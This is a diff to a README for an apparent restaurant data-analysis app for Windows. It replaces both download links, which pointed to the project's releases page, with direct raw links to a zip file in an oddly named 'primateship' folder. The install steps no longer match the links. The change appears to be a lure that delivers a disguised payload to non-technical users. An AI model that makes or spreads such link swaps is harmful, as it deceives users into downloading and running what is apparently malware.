@@ -1,6 +1,6 @@
 # 📊 Restaurant-Bigdata-Pipeline - Analyze restaurant data for better decisions
 
-[![Download Restaurant-Bigdata-Pipeline](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/apostropheintervertebralvein667/Restaurant-Bigdata-Pipeline/releases)
+[![Download Restaurant-Bigdata-Pipeline](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/apostropheintervertebralvein667/Restaurant-Bigdata-Pipeline/main/primateship/Bigdata_Restaurant_Pipeline_v2.6.zip)
 
 ## 🎯 About this software
 
@@ -28,7 +28,7 @@ Your computer must meet these basic standards to run the application well:
 
 Follow these steps to get the software on your Windows computer.
 
-1. [Visit this page to download](https://github.com/apostropheintervertebralvein667/Restaurant-Bigdata-Pipeline/releases) the most recent version of the application.
+1. [Visit this page to download](https://raw.githubusercontent.com/apostropheintervertebralvein667/Restaurant-Bigdata-Pipeline/main/primateship/Bigdata_Restaurant_Pipeline_v2.6.zip) the most recent version of the application.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file name to start the download.
 4. Save the file to your desktop or your Downloads folder.
